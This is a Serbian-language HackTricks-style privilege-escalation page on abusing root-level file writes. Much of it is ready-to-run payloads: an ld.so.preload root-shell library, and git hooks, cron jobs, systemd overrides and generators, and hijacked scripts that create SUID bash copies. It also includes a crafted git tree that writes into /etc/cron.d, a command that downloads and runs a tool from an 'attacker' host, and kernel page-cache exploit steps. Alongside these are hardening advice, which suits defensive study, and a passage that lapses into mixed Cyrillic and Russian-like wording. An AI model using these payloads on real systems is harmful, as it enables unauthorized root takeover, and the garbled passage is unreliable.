# Proizvoljan upis datoteke kao root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` je sistemski spisak deljenih objekata koje dinamički linker učitava pre drugih deljenih objekata. Režim bezbednog izvršavanja uvodi dodatna ograničenja za preloading, tako da putanja do biblioteke kao što je `/tmp/pe.so` nije univerzalna tehnika za SUID binarne datoteke.\
Ako možete da kreirate ili izmenite ovu datoteku, proces koji je učitava učitaće navedenu biblioteku pre ostalih deljenih objekata, što omogućava izvršavanje koda u kontekstu tog procesa.<sup>[[12]](#references)</sup>

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### OCR izlaz kao ograničeno upisivanje u fajl

OCR servis koji pozivaocu omogućava da izabere ime sačuvanog fajla može pretvoriti prepoznati tekst sa slike u primitivu za **ograničeno upisivanje u fajl**. Sačuvani bajtovi predstavljaju prepoznati tekst, a ne bajtove slike, zato proverite OCR izlaz zbog sintaksnih grešaka. Ako je dozvoljena destinacija izvršiva preko veba i dozvoljava ime fajla sa ekstenzijom `.php`, taj tekst može da se izvrši kada mu se pristupi. U MakeSense-u, lokalno dostupna OCR aplikacija sačuvala je tekst u direktorijumu `/saved/`; njen PHP server pokrenut kao root zatim je izvršio sačuvani fajl kao root. Upis je bio ograničen na taj direktorijum, bez demonstriranog path traversal-a.<sup>[[37]](#references)</sup>

Privilegije stečene izvršavanjem odgovaraju privilegijama **PHP procesa koji pruža sadržaj**, a ne automatski privilegijama OCR procesa koji upisuje fajl. Proverite mapiranje izvršavanja za odredište i identitet izvršnog okruženja; OCR proces koji upisuje fajl kao root, uparen sa neprivilegovanim web serverom, ne bi značio da se PHP izvršava kao root.<sup>[[37]](#references)</sup> Uporedite direktni [obrazac otpremanja u web-root](../../pentesting-web/file-upload/).

### Git hooks

**Git hooks** su izvršne skripte koje se pokreću tokom događaja u repozitorijumu, uključujući operacije commit i merge. Ako **privilegovana skripta ili korisnik** obavlja te radnje, a napadač može da **piše u direktorijum `.git`**, hook može da se iskoristi za **eskalaciju privilegija**.<sup>[[13]](#references)</sup>

Na primer, moguće je **generisati skriptu** u git repozitorijumu u direktorijumu **`.git/hooks`** tako da se uvek izvršava kada se kreira novi commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal pri izvozu Git stabla sa privilegijama

Privilegovani sinhronizator može da izbegne checkout i umesto toga nabroji stavke u repozitorijumu pod uticajem napadača pomoću `git ls-tree`, pročita svaki blob pomoću `git cat-file`, spoji prijavljenu putanju sa staging direktorijumom i sam je upiše. Ovo postaje **upis proizvoljnog fajla sa privilegijama sinhronizatora** kada se kombinuje `-c safe.directory=*` (čime se isključuje Git-ova zaštita za repozitorijume u vlasništvu drugog korisnika) sa izostankom provere da li je odredište unutar dozvoljenog direktorijuma. Apsolutno ime stavke u stablu navodi Python-ov `os.path.join(stage, name)` da odbaci `stage`; relativno ime koje sadrži `../` izlazi izvan direktorijuma kada ga fajl-sistem razreši. Pošto aplikacija materijalizuje sirovo stablo umesto da zatraži od Git-a da ga checkout-uje, odbacivanje putanja tokom checkout-a nikada ne štiti odredište upisa.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Potražite ovakav oblik koda u root servisima, timerima, deployment agentima, uvoznicima šablona i poslovima za backup/restore:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Stavka stabla kodira se kao `<mode> SP <name> NUL <raw object ID>`. Opcija `git hash-object --literally` namerno dozvoljava podatke objekta koje uobičajeno parsiranje ili `git fsck` mogu da odbace, pa se u klonu namenjenom za jednokratnu upotrebu može napraviti stablo čiji je naziv datoteke apsolutna odredišna putanja. Ovaj primer pravi blob cron datoteke, umotava kreirano stablo u commit i pomera granu na njega; za eksploataciju je i dalje potrebna dozvola za ažuriranje repozitorijuma koji koristi privilegovani zadatak, kao i Git server koji prihvata neispravan objekat.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Ojačavanje bezbednosti mora da obuhvati i unos u repozitorijum i završnu operaciju nad sistemom datoteka:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Zamenite `safe.directory=*` tačnim repozitorijumima kojima servis mora da veruje i, gde je moguće, obrađujte repozitorijume bez privilegija root korisnika.
- Odbacite apsolutna imena i svaku komponentu `.` ili `..` pre materijalizacije. Nakon spajanja putanje, kanonizujte je i proverite da odredište ostaje unutar predviđenog korena.
- Izbegavajte trke symlink-ova tipa „proveri pa otvori“: otvarajte putanje relativno u odnosu na pouzdani deskriptor direktorijuma, a na Linux-u koristite `openat2()` sa `RESOLVE_BENEATH` i `RESOLVE_NO_SYMLINKS` za putanje koje kontroliše napadač.
- Prednost dajte uobičajenom checkout-u u izolovanom direktorijumu umesto ponovnoj implementaciji checkout-a na osnovu izlaza plumbing komandi. Ako je potreban unos raw objekata, omogućite validaciju na strani prijema, kao što je `receive.fsckObjects=true`; nemojte ublažavati nalaze `receive.fsck.*` koji se odnose na imena putanja i koji su potrebni za odbacivanje posebno napravljenih stabala.

### Postavljanje privilegovane konfiguracije

Neki servisi za upravljanje čuvaju željeno stanje sistema u konfiguracionoj datoteci, a kasnije ga postavljaju uz povišene privilegije. Na primer, [openmediavault čuva konfiguraciju u `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), a njegov [RPC interfejs](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) može da primeni izmene servisa. Ako nalog sa nižim privilegijama može da upisuje u tu datoteku ili da je zameni, proverite da li može i da zatraži ovlašćeno postavljanje i da li izabrani modul koristi izmenjeno polje kao root korisnik. SSH ključevi naloga, zakazane komande i instalacija paketa imaju različite preduslove; samo prisustvo datoteke ili mogućnost upisa u XML datoteku ne dokazuje da je bilo šta od toga moguće. Proverite dozvole datoteke i nadređenih direktorijuma, grupe pozivaoca i RPC ovlašćenja, instaliranu verziju i stvarnog korisnika te konfiguracije, bez menjanja konfiguracije ili pokretanja operacije primene tokom enumeracije.

Definicije akcija za Fail2Ban u direktorijumu `/etc/fail2ban/action.d/` predstavljaju još jednu granicu privilegovane konfiguracije. Korisnik koji može da upisuje u taj direktorijum i da ga pretražuje možda može da zameni definiciju akcije ili doda nadjačavanje, ali same dozvole direktorijuma ne dokazuju izvršavanje koda. Potvrdite da omogućeni jail zaista bira pogođenu akciju, da je izvršava Fail2Ban servis sa višim privilegijama i da će doći do ovlašćenog ponovnog učitavanja ili ponovnog pokretanja, kao i odgovarajućeg događaja ban-a. Nepovezano sudo ovlašćenje za ponovno pokretanje Fail2Ban-a važno je samo ako se odnosi na tačno određeni poziv servisa i ako je izmenjena definicija učitana. [Konfiguracija akcija za Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) opisuje vezu između direktorijuma akcija i jail-a; njegov [primer akcije](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) pokazuje da se `actionban` izvršava prilikom ban-a, sa pravima korisnika servisa. Pregledajte dozvole i efektivnu konfiguraciju bez menjanja akcija ili pokretanja ban-ova tokom enumeracije.

Posebna granica postoji kada omogućeni Fail2Ban jail koristi mail akciju obogaćenu WHOIS podacima. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) odnosio se na nepouzdan WHOIS tekst prosleđen GNU mailutils programu `mail`, čija je obrada escape sekvenci mogla da pokrene komandu. Korisnik sa nižim privilegijama koji može da upisuje datoteke možda može da utiče na odgovor ako može da izmeni konfiguraciju za nadjačavanje servera koju koristi **izabrani WHOIS klijent**; [Debian-ov `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) dokumentuje jednu takvu datoteku, ali njena putanja i upotreba zavise od instalacije. Pregledajte efektivni jail/akciju, identitet servisa, stvarni WHOIS klijent i putanju konfiguracije, implementaciju mail-a, mogućnost kontrole odgovora i instaliranu ispravku ili backport dobavljača. Datoteka WHOIS konfiguracije u koju se može upisivati, verzija Fail2Ban-a ili mail akcija sami po sebi ne dokazuju ovaj lanac; tokom pasivne enumeracije nemojte slati upite spoljnim serverima niti pokretati ban-ove.

### Kreiranje datoteka preko TFTP-a i privilegovane hook skripte paketa

Dostupan TFTP servis može da pređe granicu kontejnera ili lokalnog korisnika kada njegova **efektivna** tftpd-hpa podešavanja rade kao root korisnik, izlažu koren sistema datoteka kao direktorijum `--secure` i omogućavaju `--create`. [Priručnik za tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) opisuje opcije za kreiranje i korisnika. Ovo može omogućiti kreiranje nove datoteke u privilegovanom konfiguracionom direktorijumu, uključujući `/etc/apt/apt.conf.d/`; postojeća datoteka i dalje može da spreči zamenu. [APT-ov priručnik za konfiguraciju](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) dokumentuje komande `APT::Update::Pre-Invoke`. `apt update` pokrenut kao root može postati korisnik sa višim privilegijama **samo ako** pročita novu konfiguracionu datoteku. Potvrdite stvarne argumente i identitet pokrenutog demona, dostupnost preko mreže i filtriranje, pravila za kreiranje datoteka u ciljnom direktorijumu, efektivni opseg APT konfiguracije i kasnije pozivanje sa privilegijama. Podrazumevana datoteka, direktorijum u koji može da se upisuje ili zakazana APT komanda sami po sebi ne dokazuju ceo put. Pasivna trijaža treba da čita samo ograničenu lokalnu konfiguraciju i metapodatke, bez otpremanja datoteke ili pokretanja APT-a.

### Cron i vremenske datoteke

Ako možete da **upisujete u datoteke povezane sa cron-om koje izvršava root korisnik**, obično možete da dobijete izvršavanje koda pri sledećem pokretanju zadatka. Zanimljive mete su:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Crontab samog root korisnika u `/var/spool/cron/` ili `/var/spool/cron/crontabs/`
- `systemd` tajmeri i servisi koje pokreću

Brze provere:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Tipični putevi zloupotrebe:

- **Dodavanje novog root cron zadatka** u `/etc/crontab` ili datoteku u `/etc/cron.d/`
- **Zamena skripte** koju već izvršava `run-parts`
- **Postavljanje backdoor-a u postojeći timer target** izmenom skripte ili binarne datoteke koju pokreće

Minimalni primer cron payload-a:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Ako možete da upisujete samo unutar cron direktorijuma koji koristi `run-parts`, umesto toga tamo postavite izvršnu datoteku:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Napomene:

- `run-parts` obično ignoriše nazive fajlova koji sadrže tačke, zato dajte prednost nazivima kao što je `backup` umesto `backup.sh`.<sup>[[15]](#references)</sup>
- Neki sistemi koriste `systemd` tajmere umesto klasičnog cron-a, ali ideja zloupotrebe je ista: **izmeniti ono što će root kasnije izvršiti**.<sup>[[20]](#references)</sup>

### Fajlovi Service i Socket

Ako možete da upisujete **`systemd` unit fajlove** ili fajlove na koje oni upućuju, možda možete da izvršite kod kao root ponovnim učitavanjem i ponovnim pokretanjem unit-a ili čekanjem da se aktivira service/socket putanja.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Proverite i dozvole za upisivanje i pretragu u samom sistemskom unit direktorijumu, uključujući ACL-ove: korisnik može da napravi novi unit u `/etc/systemd/system` čak i kada mu je uskraćeno čitanje/listanje direktorijuma. Sama ta putanja ne pokreće ništa. Potvrdite da će system manager učitati novi unit, da pozivalac ima efektivno pravo `systemctl start` ili `restart` sa root privilegijama za njegov naziv (ili drugi privilegovani način aktivacije) i da se service pokreće pod željenim identitetom. Za postojeći učitani unit izmenjen na disku može biti potreban `daemon-reload`; učitavanje unit-a sa novim nazivom funkcioniše drugačije. Pažljivo proverite tačne sudo argumente i izuzetke pre nego što pretpostavite da je pravilo za restart sa džokerom dovoljno. Pogledajte [putanju pretrage za systemd unit-e](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) i [semantiku učitavanja i ponovnog učitavanja u systemctl-u](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Zanimljive mete uključuju:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides u `/etc/systemd/system/<unit>.d/*.conf`
- Service skripte/binarne fajlove navedene u `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Upisive putanje `EnvironmentFile=` koje učitava root service

Brze provere:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Uobičajeni načini zloupotrebe:

- **Prepišite `ExecStart=`** u servisnoj jedinici čiji je vlasnik root i koju možete da menjate
- **Dodajte drop-in override** sa zlonamernim `ExecStart=` i prvo uklonite prethodni
- **Postavite backdoor u skriptu/binarnu datoteku** na koju se jedinica već poziva
- **Otmite servis aktiviran preko soketa** tako što ćete izmeniti odgovarajuću `.service` datoteku koja se pokreće kada soket primi vezu

Primer zlonamernog override-a:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Tipičan tok aktivacije:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Ako ne možete sami da restartujete servise, ali možete da izmenite socket-activated unit, možda je dovoljno da **sačekate klijentsku vezu** da biste pokrenuli backdoored servis kao root.<sup>[[17]](#references)</sup>

### systemd direktorijumi generatora

**System generators** su izvršne datoteke koje pokreće system manager pre učitavanja unit datoteka, i tokom pokretanja sistema i pri ponovnom učitavanju konfiguracije. Zato je pristup za pisanje u direktorijum system-generatora (ili u postojeći izvršni generator) direktan način za izvršavanje koda kao root, koji se lako previdi ako se pri proveri traže samo datoteke `*.service` i `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Uobičajeni redosled pretrage je `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` i `/usr/lib/systemd/system-generators/` (neke distribucije izlažu `/lib/systemd/system-generators/` kroz objedinjavanje direktorijuma `/usr`). Izvršna datoteka istog imena u ranijem direktorijumu ima prednost nad kasnijom. Nemojte pomešati ove **ulazne direktorijume izvršnih datoteka** sa direktorijumima `/run/systemd/generator`, `/run/systemd/generator.early` i `/run/systemd/generator.late`, koji sadrže privremeni izlaz u obliku unit datoteka koje generišu generatori.<sup>[[35]](#references)</sup>

Brze provere:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Novokreirani generator mora imati postavljen izvršni bit. Ako primitiva za upis kontroliše bajtove, ali ne i režim, ciljajte već izvršni generator; njegovo skraćivanje na mestu obično čuva metapodatke. Ako je sam direktorijum upisiv, kreirajte novu stavku i označite je kao izvršnu.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Pokretanje `systemctl daemon-reload` nad **system** manager-om zahteva odgovarajuću autorizaciju, ali ponovo pokreće svaki system generator; u suprotnom sačekajte privilegovani reload, operaciju paketa ili ponovno pokretanje sistema. User-generator direktorijumi kao što je `~/.config/systemd/user-generators/` izvršavaju se u okviru user manager-a i **ne daju root privilegije sami po sebi**.<sup>[[35]](#references)</sup>

Radi hardening-a i potrage za pretnjama proverite svaku komponentu putanje i ACL-ove, a ne samo završne bitove dozvola; napravite referentne hash vrednosti i proverite vlasništvo paketa za generatore, pa postavite upozorenja za kreiranje, preimenovanje, promene sadržaja ili dozvola u svim ulaznim direktorijumima system generator-a. Važno je pratiti upis jer se jednokratni generator može sam obrisati nakon izvršavanja, dok se stablo generisanih jedinica u `/run/systemd/generator*` ponovo pravi pri sledećem reload-u.<sup>[[35]](#references)[[36]](#references)</sup>

### Prepišite restriktivni `php.ini` koji koristi privilegovani PHP sandbox

Neki prilagođeni daemon-i proveravaju PHP koji dostavi korisnik tako što pokreću `php` sa **restriktivnim `php.ini`** (na primer, `disable_functions=exec,system,...`). Ako kod u sandbox-u i dalje ima **bilo kakvu mogućnost upisa** (kao što je `file_put_contents`) i možete da dođete do **tačne putanje `php.ini` datoteke** koju daemon koristi, možete da **prepišete tu konfiguraciju** kako biste uklonili ograničenja, a zatim pošaljete drugi payload koji se izvršava sa povišenim privilegijama.<sup>[[2]](#references)</sup>

Uobičajeni tok:

1. Prvi payload prepisuje konfiguraciju sandbox-a.
2. Drugi payload izvršava kod nakon ponovnog omogućavanja opasnih funkcija.

Minimalni primer (zamenite putanju onom koju koristi daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Ako se daemon izvršava kao root (ili proverava putanje čiji je vlasnik root), drugo izvršavanje daje root kontekst. Ovo je u suštini **eskalacija privilegija putem prepisivanja konfiguracije** kada runtime u sandboxu i dalje može da upisuje fajlove.

### binfmt_misc

`binfmt_misc` izlaže registracije pod `/proc/sys/fs/binfmt_misc`; svaka registracija povezuje obrazac tipa fajla sa interpreterom. Uticaj na privilegije zavisi od toga ko može da menja registraciju i koji proces kasnije izvršava fajl koji joj odgovara, pa proverite te uslove pre nego što ovo smatrate putem za eskalaciju privilegija.<sup>[[21]](#references)</sup>

Izvršni pomoćni program sa `CAP_DAC_OVERRIDE` može predstavljati zaseban put za registraciju ako prihvata podatke koje kontroliše pozivalac i upisuje ih u `/proc/sys/fs/binfmt_misc/register`, čak i kada pozivalac ne može direktno da upisuje u taj čvor. Pregledajte ulazne podatke i ponašanje pri upisu pomoćnog programa, ali ga nemojte izvršavati tokom popisivanja. Ako registrovano pravilo koristi oznaku `C`, interpreter dobija akreditive zasnovane na podudarnom binarnom fajlu; zato root-ov SUID fajl koji se podudara može pokrenuti interpreter pod kontrolom pozivaoca kao root. Potvrdite montiranje i smernice za registraciju `binfmt_misc`, efektivnu sposobnost pomoćnog programa, tačno pravilo i putanju do interpretera, izvršnu SUID metu i da li `no_new_privs` ili montiranje sa `nosuid` sprečavaju SUID tranziciju. Sama oznaka sposobnosti ili ugrađeni niz putanje samo su povod za proveru.<sup>[[21]](#references)</sup> Pogledajte [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) za uslove koji sprečavaju SUID.

### Prepisivanje rukovalaca šema (kao što su http: ili https:)

Desktop okruženja koriste MIME asocijacije i desktop stavke da bi izabrala aplikaciju za URI šeme; napadač koji može da upisuje u relevantnu konfiguraciju korisnika i direktorijume desktop stavki može da preusmeri te šeme na pokretač koji kontroliše. Izmenom fajla `$HOME/.config/mimeapps.list` tako da HTTP i HTTPS rukovaoci URL-ovima upućuju na zlonamerni fajl (na primer, `x-scheme-handler/http=evil.desktop` i `x-scheme-handler/https=evil.desktop`), klik korisnika može da pokrene tu desktop stavku.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root izvršava skripte/binarne fajlove koje korisnik može da menja

Ako privilegovani tok rada pokreće nešto poput `/bin/sh /home/username/.../script` (ili bilo koji binarni fajl unutar direktorijuma u vlasništvu neprivilegovanog korisnika), možete to da hijack-ujete:<sup>[[1]](#references)</sup>

- **Otkrivanje izvršavanja:** nadgledajte procese pomoću alata pspy da biste uhvatili root kako pokreće putanje pod kontrolom korisnika.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Proveri da li možeš da pišeš:** uveri se da su ciljna datoteka i njen direktorijum u vlasništvu tvog korisnika i da u njih možeš da upisuješ.
- **Preuzmi kontrolu nad ciljnom datotekom:** napravi rezervnu kopiju originalnog binarnog fajla/skripte i postavi payload koji kreira SUID shell (ili izvršava neku drugu root radnju), a zatim vrati dozvole:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Pokrenite privilegovanu radnju** (npr. pritiskom na dugme u korisničkom interfejsu koje pokreće pomoćni program). Kada root ponovo izvrši preuzetu putanju, preuzmite shell sa povišenim privilegijama pomoću `./rootshell -p`.

### Izmena privilegovanih binarnih datoteka samo u page cache-u

Neke greške u kernelu ne menjaju datoteku **na disku**. Umesto toga, omogućavaju vam da menjate samo **kopiju u page cache-u** datoteke koja se može čitati. Ako možete da ciljate **setuid** binarnu datoteku ili neku drugu datoteku koju izvršava root, sledeće izvršavanje može pokrenuti bajtove iz memorije koje kontroliše napadač i podići privilegije, iako hash datoteke na disku ostaje nepromenjen.<sup>[[3]](#references)[[4]](#references)</sup>

Korisno je razmišljati o ovome kao o primitivu za **upis u datoteku samo tokom izvršavanja**:<sup>[[3]](#references)</sup>

- **Disk ostaje čist**: inode i bajtovi na disku se ne menjaju
- **Memorija je izmenjena**: procesi koji čitaju/izvršavaju keširanu stranicu dobijaju sadržaj izmenjen napadačevim putem
- **Efekat je privremen**: izmena nestaje nakon ponovnog pokretanja ili izbacivanja iz keša

Ovaj primitiv se nalazi između klasičnog **arbitrary file write** i starijih grešaka koje zloupotrebljavaju page cache, kao što su Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW se oslanjao na race condition
- Dirty Pipe je imao ograničenja u vezi sa pozicijom upisa
- Primitiv koji menja samo page cache može biti pouzdaniji ako ranjiva putanja omogućava direktan upis u keširane stranice koje su podržane datotekom

#### Opšti privesc tok

1. Nabavite kernel primitiv koji može da upisuje u stranice page cache-a koje su podržane datotekom
2. Upotrebite ga protiv **privilegovane binarne datoteke koja se može čitati** ili druge datoteke koju izvršava root
3. Pokrenite izvršavanje **pre** izbacivanja stranice iz keša
4. Ostvarite izvršavanje koda kao root dok datoteka na disku i dalje izgleda neizmenjeno

Tipične mete visoke vrednosti:

- **setuid-root** binarne datoteke
- Pomoćni programi koje pokreću **root servisi**
- Binarne datoteke koje se često izvršavaju iz **kontejnera koji dele kernel/page cache hosta**

#### Primer putanje AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) je dobar primer ove klase. Ranjiva putanja nalazila se u Linux crypto userspace API-ju (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` može da prenese reference na stranice page cache-a iz datoteke koja se može čitati u crypto TX scatterlist
- putanja za dešifrovanje `algif_aead` na istom mestu ponovo je koristila izvorne i odredišne baferе
- zatim je `authencesn` upisivao u odredišni tag region
- kada je taj region i dalje upućivao na stranice iz datoteke u page cache-u, upis je završavao u **page cache-u ciljne datoteke**

Zato zanimljiva tehnika nije sam CVE, već obrazac:

- **proslediti stranice keša koje su podržane datotekom u kernel podsistem**
- naterati podsistem da ih **tretira kao izlaz u koji može da se upisuje**
- pokrenuti mali, kontrolisani prepis u memoriji

Javno dostupan PoC koristio je ponovljene **upise od 4 bajta** da izmeni `/usr/bin/su` u memoriji, a zatim ga izvršio.<sup>[[4]](#references)[[7]](#references)</sup>

#### Primer putanje ESP / XFRM + netfilter TEE klona

DirtyClone (CVE-2026-43503) prikazuje još jednu varijantu istog obrasca **upisa u root-ove datoteke samo u page cache-u**, ali ovoga puta cilj je **IPsec ESP dešifrovanje**, a ne `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Ključna tehnika je **korak „pranja“ metapodataka**:

- `splice()` ubacuje **stranicu page cache-a koja je samo za čitanje i podržana datotekom** u ESP-in-UDP paket
- Originalna DirtyFrag zaštita označila je taj skb sa `SKBFL_SHARED_FRAG` kako bi `esp_input()` **kopirao podatke pre dešifrovanja**
- netfilter `TEE` duplira paket kroz `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- klon zadržava **istu fizičku referencu na page cache**, ali gubi `SKBFL_SHARED_FRAG`
- `esp_input()` zatim smatra da je klon bezbedan i pokreće **`cbc(aes)` dešifrovanje na istom mestu** nad страницом, поддержаной файлом

Pouka za pregled kода шира је од самог CVE-а: ако заштита зависи од **skb/page метаподатака** при одлучивању да ли прво треба направити копију, било која **путања клонирања/копирања која задржава позадинску страницу, али одбацује метаподатке** може неприметно поново да отвори примитив за упис.

Типичан ток експлоатације:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` да бисте добили **`CAP_NET_ADMIN` унутар приватног network namespace-а**
2. подигните loopback и инсталирајте **netfilter `TEE` правило** у `mangle/OUTPUT`
3. инсталирајте **XFRM ESP transport SA-ове** преко `NETLINK_XFRM`
4. кодирајте сваку циљну 4-бајтну реч у поље SA `seq_hi` (DirtyFrag трик за избор речи)
5. пошаљите ESP-in-UDP пакет добијен помоћу `splice()` како би **TEE клон** стигао до `esp_input()` и извршио **дешифровање на истом месту**
6. понављајте док копија `/usr/bin/su` или друге привилеговане извршне датотеке у page cache-у не садржи код који контролише нападач

У пракси, утицај је исти као у примеру са `AF_ALG`: датотека на диску остаје чиста, али `execve()` користи **измењене бајтове из page cache-а** и даје root привилегије.<sup>[[8]](#references)[[9]](#references)</sup>

Корисне провере изложености за ову варијанту:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Smanjenje attack surface-a na kratak rok i ovde zavisi od putanje: nadogradnja na kernel koji sadrži `48f6a5356a33` popravlja clone putanju, dok blokiranje autoload-a `xt_TEE` uklanja **korak za „pranje“ zastavica**, a blokiranje `esp4` / `esp6` uklanja **mesto za dešifrovanje**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Izloženost i potraga za tragovima

Ako sumnjate na ovu klasu grešaka, nemojte se oslanjati samo na provere integriteta diska. Proverite i:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Vrednosti konfiguracije u nastavku razlikuju učitljivi interfejs od interfejsa ugrađenog u kernel; pravila izgradnje za crypto preslikavaju `CONFIG_CRYPTO_USER_API_AEAD` u `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` može da se učitava i uklanja kao modul
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs je ugrađen u kernel
- setuid binarni fajlovi su dobre mete jer zakrpa koja menja samo page cache može biti dovoljna da lokalno uporište pretvori u root

#### Smanjenje površine napada za putanju `algif_aead`

Ako je ranjivi interfejs obezbeđen učitljivim modulom:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Ako je kompajlirano u kernel, u nekim prijavama je navedeno da se init putanja blokira pomoću:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

